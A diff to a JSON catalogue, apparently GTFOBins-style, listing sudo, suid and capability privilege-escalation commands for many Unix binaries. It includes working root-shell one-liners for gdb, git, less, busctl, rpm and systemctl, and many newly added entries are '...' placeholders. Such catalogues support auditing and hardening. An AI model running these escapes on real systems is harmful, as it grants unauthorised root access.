@@ -45,12 +45,18 @@
   },
   "apt-get": {
     "sudo": [
+      "apt-get changelog apt",
       "echo 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' >/path/to/temp-file\napt-get -y install -c /path/to/temp-file sl",
       "apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"
     ],
     "suid": [
       "echo 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' >/path/to/temp-file\napt-get -y install -c /path/to/temp-file sl",
       "apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"
+    ]
+  },
+  "aptitude": {
+    "sudo": [
+      "aptitude changelog aptitude"
     ]
   },
   "arch-nspawn": {
@@ -105,6 +111,11 @@
       "echo '/bin/sh 1>&0' >/path/to/temp-file\nchmod +x /path/to/temp-file\necho AC_INIT >configure.ac\nAUTOM4TE=/path/to/temp-file autoreconf"
     ]
   },
+  "aws": {
+    "sudo": [
+      "aws help"
+    ]
+  },
   "bash": {
     "sudo": [
       "bash"
@@ -113,9 +124,30 @@
       "bash -p"
     ]
   },
+  "bashbug": {
+    "sudo": [
+      "bashbug"
+    ]
+  },
+  "batcat": {
+    "sudo": [
+      "batcat --paging always /etc/hosts"
+    ],
+    "suid": [
+      "batcat --paging always /etc/hosts"
+    ]
+  },
   "bconsole": {
     "sudo": [
       "bconsole\n@exec /bin/sh"
+    ]
+  },
+  "bee": {
+    "sudo": [
+      "bee eval '...'"
+    ],
+    "suid": [
+      "bee eval '...'"
     ]
   },
   "borg": {
@@ -132,6 +164,8 @@
   },
   "bundle": {
     "sudo": [
+      "bundle help",
+      "touch Gemfile\nbundle console",
       "BUNDLE_GEMFILE=x bundle exec /bin/sh",
       "touch Gemfile\nbundle exec /bin/sh",
       "echo 'system(\"/bin/sh\")' >Gemfile\nbundle install"
@@ -139,12 +173,25 @@
   },
   "busctl": {
     "sudo": [
+      "busctl --show-machine",
       "busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'",
       "busctl --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'"
     ],
     "suid": [
+      "busctl --show-machine",
       "busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'",
       "busctl --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'"
+    ]
+  },
+  "busybox": {
+    "sudo": [
+      "busybox ash",
+      "busybox cat"
+    ]
+  },
+  "byebug": {
+    "sudo": [
+      "byebug --no-stop /path/to/script.rb"
     ]
   },
   "cabal": {
@@ -161,6 +208,11 @@
     ],
     "suid": [
       "capsh --gid=0 --uid=0 --"
+    ]
+  },
+  "cargo": {
+    "sudo": [
+      "cargo help doc"
     ]
   },
   "cdist": {
@@ -238,6 +290,21 @@
       "echo '{\"scripts\":{\"x\":\"/bin/sh\"}}' >composer.json\ncomposer run-script x"
     ]
   },
+  "cowsay": {
+    "sudo": [
+      "cowsay -f /path/to/script.pl x"
+    ]
+  },
+  "cowthink": {
+    "sudo": [
+      "cowthink -f /path/to/script.pl x"
+    ]
+  },
+  "cpan": {
+    "sudo": [
+      "cpan\n! ..."
+    ]
+  },
   "cpio": {
     "sudo": [
       "echo '/bin/sh </dev/tty >/dev/tty' >localhost\ncpio -o --rsh-command /bin/sh -F localhost:"
@@ -253,11 +320,16 @@
   },
   "crash": {
     "sudo": [
-      "CRASHPAGER=/path/to/command crash -h"
+      "CRASHPAGER=/path/to/command crash -h",
+      "crash -h"
+    ],
+    "suid": [
+      "crash -h"
     ]
   },
   "crontab": {
     "sudo": [
+      "crontab -e",
       "crontab -e"
     ]
   },
@@ -322,6 +394,14 @@
       "distcc /bin/sh -p"
     ]
   },
+  "dmesg": {
+    "sudo": [
+      "dmesg -H"
+    ],
+    "suid": [
+      "dmesg -H"
+    ]
+  },
   "dmsetup": {
     "sudo": [
       "dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\ndmsetup ls --exec '/bin/sh -s'"
@@ -365,7 +445,16 @@
   },
   "dpkg": {
     "sudo": [
+      "dpkg -l",
       "dpkg -i x_1.0_all.deb"
+    ],
+    "suid": [
+      "dpkg -l"
+    ]
+  },
+  "dstat": {
+    "sudo": [
+      "dstat --xxx"
     ]
   },
   "dvips": {
@@ -376,12 +465,22 @@
       "dvips -R0 texput.dvi"
     ]
   },
+  "easy_install": {
+    "sudo": [
+      "echo '...' >setup.py\neasy_install ."
+    ]
+  },
   "easyrsa": {
     "sudo": [
       "echo 'set_var X \"$(/bin/sh 1>&0)\"' >/path/to/temp-file\neasyrsa --vars=/path/to/temp-file"
     ],
     "suid": [
       "echo 'set_var X \"$(/bin/sh 1>&0)\"' >/path/to/temp-file\neasyrsa --vars=/path/to/temp-file"
+    ]
+  },
+  "eb": {
+    "sudo": [
+      "eb logs"
     ]
   },
   "ed": {
@@ -423,10 +522,17 @@
   },
   "ex": {
     "sudo": [
+      "ex",
       "ex -c ':!/bin/sh'"
     ],
     "suid": [
+      "ex",
       "ex -c ':!/bin/sh'"
+    ]
+  },
+  "exiftool": {
+    "sudo": [
+      "exiftool -if '...' /etc/passwd"
     ]
   },
   "expect": {
@@ -435,6 +541,12 @@
     ],
     "suid": [
       "expect -c 'spawn /bin/sh -p;interact'"
+    ]
+  },
+  "facter": {
+    "sudo": [
+      "FACTERLIB=/path/to/dir/ facter",
+      "facter --custom-dir=/path/to/dir/ x"
     ]
   },
   "fail2ban-client": {
@@ -521,19 +633,32 @@
       "gcc -wrapper /bin/sh,-s x"
     ]
   },
+  "gcloud": {
+    "sudo": [
+      "gcloud help"
+    ],
+    "suid": [
+      "gcloud help"
+    ]
+  },
   "gdb": {
     "capabilities": [
       "gdb -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/sh' -ex quit"
     ],
     "sudo": [
+      "gdb -nx -ex 'python ...' -ex quit",
       "gdb -nx -ex '!/bin/sh' -ex quit"
     ],
     "suid": [
+      "gdb -nx -ex 'python ...' -ex quit",
       "gdb -nx -ex '!/bin/sh' -ex quit"
     ]
   },
   "gem": {
     "sudo": [
+      "gem open debug",
+      "gem build /path/to/script.rb",
+      "gem install --file /path/to/script.rb",
       "gem open -e '/bin/sh -s' debug"
     ]
   },
@@ -555,6 +680,11 @@
       "ghci\nSystem.Process.callCommand \"/bin/sh\""
     ]
   },
+  "gimp": {
+    "sudo": [
+      "gimp -idf --batch-interpreter=python-fu-eval -b '...'"
+    ]
+  },
   "ginsh": {
     "sudo": [
       "ginsh\n!/bin/sh"
@@ -565,6 +695,8 @@
   },
   "git": {
     "sudo": [
+      "git help config",
+      "git branch --help config\n!/bin/sh",
       "PAGER='/bin/sh -c \"exec sh 0<&1\"' git -p help",
       "git init .\necho 'exec /bin/sh 0<&2 1>&2' >.git/hooks/pre-commit\nchmod +x .git/hooks/pre-commit\ngit -C . commit --allow-empty -m x",
       "ln -s /bin/sh git-x\ngit --exec-path=. x"
@@ -674,6 +806,11 @@
       "joe\n^K!/bin/sh"
     ]
   },
+  "journalctl": {
+    "sudo": [
+      "journalctl"
+    ]
+  },
   "jrunscript": {
     "sudo": [
       "jrunscript -e 'exec(\"/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty\")'"
@@ -700,6 +837,11 @@
       "julia -e 'run(`/bin/sh -p`)'"
     ]
   },
+  "knife": {
+    "sudo": [
+      "knife exec -E '...'"
+    ]
+  },
   "ksu": {
     "sudo": [
       "ksu -q -e /bin/sh"
@@ -720,17 +862,20 @@
   },
   "latexmk": {
     "sudo": [
+      "latexmk -e '...'",
       "latexmk -pdf -pdflatex='/bin/sh #' /dev/null"
     ]
   },
   "less": {
     "sudo": [
       "LESSOPEN='/path/to/command # %s' less /etc/hosts",
+      "less /etc/hosts\nv",
       "less /etc/hosts\n!/bin/sh",
       "LESSOPEN=\"/bin/sh -s 1>&0 2>&0 # %s\" less /etc/hosts\nreset",
       "VISUAL='/bin/sh -s --' less /etc/hosts\nv"
     ],
     "suid": [
+      "less /etc/hosts\nv",
       "less /etc/hosts\n!/bin/sh"
     ]
   },
@@ -773,6 +918,22 @@
       "lua -e 'os.execute(\"/bin/sh\")'"
     ]
   },
+  "lualatex": {
+    "sudo": [
+      "lualatex -shell-escape '\\directlua{...}\\end'"
+    ],
+    "suid": [
+      "lualatex -shell-escape '\\directlua{...}\\end'"
+    ]
+  },
+  "luatex": {
+    "sudo": [
+      "luatex -shell-escape '\\directlua{...}\\end'"
+    ],
+    "suid": [
+      "luatex -shell-escape '\\directlua{...}\\end'"
+    ]
+  },
   "lxd": {
     "sudo": [
       "lxc init ubuntu:16.04 x -c security.privileged=true\nlxc config device add x x disk source=/ path=/mnt/ recursive=true\nlxc start x\nlxc exec x /bin/sh",
@@ -813,9 +974,11 @@
   },
   "man": {
     "sudo": [
+      "man man",
       "man '-H/bin/sh #' man"
     ],
     "suid": [
+      "man man",
       "man '-H/bin/sh #' man"
     ]
   },
@@ -848,6 +1011,11 @@
   "mosh-server": {
     "sudo": [
       "mosh --server=mosh-server localhost /bin/sh"
+    ]
+  },
+  "msfconsole": {
+    "sudo": [
+      "msfconsole\nirb"
     ]
   },
   "msgfilter": {
@@ -900,6 +1068,11 @@
       "ncftp\n!/bin/sh -p"
     ]
   },
+  "needrestart": {
+    "sudo": [
+      "echo '...' >/path/to/temp-file\nneedrestart -c /path/to/temp-file"
+    ]
+  },
   "neofetch": {
     "sudo": [
       "echo 'exec /bin/sh' >/path/to/temp-file\nneofetch --config /path/to/temp-file"
@@ -915,9 +1088,11 @@
   },
   "nmap": {
     "sudo": [
+      "echo '...' >/path/to/temp-file\nnmap --script=/path/to/temp-file",
       "nmap --interactive\n!/bin/sh"
     ],
     "suid": [
+      "echo '...' >/path/to/temp-file\nnmap --script=/path/to/temp-file",
       "nmap --interactive\n!/bin/sh"
     ]
   },
@@ -961,7 +1136,8 @@
   },
   "opencode": {
     "sudo": [
-      "opencode\n! /path/to/command"
+      "opencode\n! /path/to/command",
+      "opencode db '...'"
     ],
     "suid": [
       "opencode\n! /path/to/command"
@@ -983,6 +1159,19 @@
   "opkg": {
     "sudo": [
       "rpm opkg install x_1.0_all.deb"
+    ]
+  },
+  "pandoc": {
+    "sudo": [
+      "echo '...' >/path/to/temp-file\npandoc -L /path/to/temp-file /dev/null"
+    ],
+    "suid": [
+      "echo '...' >/path/to/temp-file\npandoc -L /path/to/temp-file /dev/null"
+    ]
+  },
+  "pdb": {
+    "sudo": [
+      "echo '...' >/path/to/temp-file\npdb /path/to/temp-file\ncont"
     ]
   },
   "pdflatex": {
@@ -1083,7 +1272,13 @@
   },
   "pip": {
     "sudo": [
+      "echo '...' >setup.py\npip install --break-system-packages .",
       "pip config --editor '/bin/sh -s' edit"
+    ]
+  },
+  "pipx": {
+    "sudo": [
+      "echo '...' >/path/to/file.py\npipx run /path/to/file.py"
     ]
   },
   "pkexec": {
@@ -1109,6 +1304,11 @@
       "podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh"
     ]
   },
+  "poetry": {
+    "sudo": [
+      "echo '...' >/path/to/temp-file\npoetry run python /path/to/temp-file"
+    ]
+  },
   "posh": {
     "sudo": [
       "posh"
@@ -1117,6 +1317,11 @@
   "procmail": {
     "sudo": [
       "echo -e ':0\\n| /path/to/command >/path/to/temp-file\nprocmail -m /path/to/temp-file"
+    ]
+  },
+  "pry": {
+    "sudo": [
+      "pry"
     ]
   },
   "psftp": {
@@ -1129,9 +1334,11 @@
   },
   "psql": {
     "sudo": [
+      "psql\n\\?",
       "psql\n\\! /bin/sh"
     ],
     "suid": [
+      "psql\n\\?",
       "psql\n\\! /bin/sh"
     ]
   },
@@ -1154,6 +1361,11 @@
     ],
     "suid": [
       "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
+    ]
+  },
+  "rake": {
+    "sudo": [
+      "rake -p '...'"
     ]
   },
   "ranger": {
@@ -1194,35 +1406,43 @@
   "rpm": {
     "sudo": [
       "rpm -ivh x-1.0-1.noarch.rpm",
+      "rpm --eval '%{lua:...}'",
       "rpm --eval '%(/bin/sh 1>&2)'",
       "rpm --pipe '/bin/sh 0<&1'"
     ],
     "suid": [
+      "rpm --eval '%{lua:...}'",
       "rpm --eval '%(/bin/sh 1>&2)'",
       "rpm --pipe '/bin/sh 0<&1'"
     ]
   },
   "rpmdb": {
     "sudo": [
+      "rpmdb --eval '%{lua:...}'",
       "rpmdb --eval '%(/bin/sh 1>&2)'"
     ],
     "suid": [
+      "rpmdb --eval '%{lua:...}'",
       "rpmdb --eval '%(/bin/sh 1>&2)'"
     ]
   },
   "rpmquery": {
     "sudo": [
+      "rpmquery --eval '%{lua:...}'",
       "rpmquery --eval '%(/bin/sh 1>&2)'"
     ],
     "suid": [
+      "rpmquery --eval '%{lua:...}'",
       "rpmquery --eval '%(/bin/sh 1>&2)'"
     ]
   },
   "rpmverify": {
     "sudo": [
+      "rpmverify --eval '%{lua:...}'",
       "rpmverify --eval '%(/bin/sh 1>&2)'"
     ],
     "suid": [
+      "rpmverify --eval '%{lua:...}'",
       "rpmverify --eval '%(/bin/sh 1>&2)'"
     ]
   },
@@ -1255,6 +1475,12 @@
       "ruby -e 'exec \"/bin/sh\"'"
     ]
   },
+  "run-mailcap": {
+    "sudo": [
+      "run-mailcap --action=view text/plain:/etc/hosts",
+      "run-mailcap --action=edit text/plain:/path/to/output-file"
+    ]
+  },
   "run-parts": {
     "sudo": [
       "run-parts --new-session --regex '^sh$' /bin",
@@ -1271,6 +1497,11 @@
     ],
     "suid": [
       "echo '! exec /bin/sh' >/path/to/temp-file\nrunscript /path/to/temp-file"
+    ]
+  },
+  "rustc": {
+    "sudo": [
+      "rustc --explain E0001"
     ]
   },
   "rustup": {
@@ -1420,6 +1651,11 @@
       "sqlite3 /dev/null '.shell /bin/sh'"
     ]
   },
+  "sqlmap": {
+    "sudo": [
+      "sqlmap -u 127.0.0.1 --eval='...'"
+    ]
+  },
   "ssh": {
     "sudo": [
       "ssh localhost /bin/sh",
@@ -1501,11 +1737,18 @@
   },
   "systemctl": {
     "sudo": [
+      "systemctl",
       "echo '[Service]\nType=oneshot\nExecStart=/path/to/command\n[Install]\nWantedBy=multi-user.target' >/path/to/temp-file.service\nsystemctl link /path/to/temp-file.service\nsystemctl enable --now /path/to/temp-file.service",
       "echo /bin/sh >/path/to/temp-file\nchmod +x /path/to/temp-file\nSYSTEMD_EDITOR=/path/to/temp-file systemctl edit basic.target"
     ],
     "suid": [
+      "systemctl",
       "echo '[Service]\nType=oneshot\nExecStart=/path/to/command\n[Install]\nWantedBy=multi-user.target' >/path/to/temp-file.service\nsystemctl link /path/to/temp-file.service\nsystemctl enable --now /path/to/temp-file.service"
+    ]
+  },
+  "systemd-resolve": {
+    "sudo": [
+      "systemd-resolve --status"
     ]
   },
   "systemd-run": {
@@ -1602,6 +1845,11 @@
       "time /bin/sh -p"
     ]
   },
+  "timedatectl": {
+    "sudo": [
+      "timedatectl list-timezones"
+    ]
+  },
   "timeout": {
     "sudo": [
       "timeout 0 /bin/sh"
@@ -1643,6 +1891,11 @@
       "torsocks /bin/sh"
     ]
   },
+  "tshark": {
+    "sudo": [
+      "echo '...' >/path/to/temp-file\ntshark -Xlua_script:/path/to/temp-file"
+    ]
+  },
   "unshare": {
     "sudo": [
       "unshare /bin/sh"
@@ -1654,6 +1907,11 @@
   "uv": {
     "sudo": [
       "uv run /bin/sh"
+    ]
+  },
+  "vagrant": {
+    "sudo": [
+      "echo '...' >Vagrantfile\nvagrant up"
     ]
   },
   "valgrind": {
@@ -1673,6 +1931,34 @@
       "vi -c ':shell'",
       "vi -c ':set shell=/bin/sh\\ -p | shell'",
       "vi -c ':terminal /bin/sh -p'"
+    ]
+  },
+  "vigr": {
+    "sudo": [
+      "vigr"
+    ],
+    "suid": [
+      "vigr"
+    ]
+  },
+  "vim": {
+    "sudo": [
+      "vim -c ':py ...'",
+      "vim -c ':lua ...'",
+      "vim"
+    ],
+    "suid": [
+      "vim -c ':py ...'",
+      "vim -c ':lua ...'",
+      "vim"
+    ]
+  },
+  "vipw": {
+    "sudo": [
+      "vipw"
+    ],
+    "suid": [
+      "vipw"
     ]
   },
   "virsh": {
@@ -1701,6 +1987,19 @@
     ],
     "suid": [
       "echo -e '#!/bin/sh -p\\n/bin/sh -p 1>&0' >/path/to/temp-file\nchmod +x /path/to/temp-file\nwget --use-askpass=/path/to/temp-file 0"
+    ]
+  },
+  "wireshark": {
+    "sudo": [
+      "wireshark"
+    ]
+  },
+  "wish": {
+    "sudo": [
+      "wish"
+    ],
+    "suid": [
+      "wish"
     ]
   },
   "xargs": {
@@ -1774,11 +2073,21 @@
       "zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #'"
     ]
   },
+  "zless": {
+    "sudo": [
+      "zless /path/to/input-file"
+    ],
+    "suid": [
+      "zless /path/to/input-file"
+    ]
+  },
   "zsh": {
     "sudo": [
+      "zsh -c '</etc/hosts'",
       "zsh"
     ],
     "suid": [
+      "zsh -c '</etc/hosts'",
       "zsh"
     ]
   },
